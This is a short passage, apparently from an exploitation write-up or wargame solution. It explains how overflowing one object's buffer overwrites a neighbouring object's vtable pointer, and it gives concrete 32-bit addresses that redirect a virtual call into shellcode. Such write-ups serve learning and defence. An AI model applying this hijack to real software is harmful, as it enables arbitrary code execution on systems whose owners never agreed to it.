   a's buffer, hence (by overflow) b's vtable pointer. Choose:
     b->vptr        = 0x0804a00c   (start of our buffer)
     *(0x0804a00c)  = 0x0804a010   (address of our shellcode)
     0x0804a010     = shellcode
   Then: vptr = 0x0804a00c ; fn = *(0x0804a00c) = 0x0804a010 ; call shellcode.

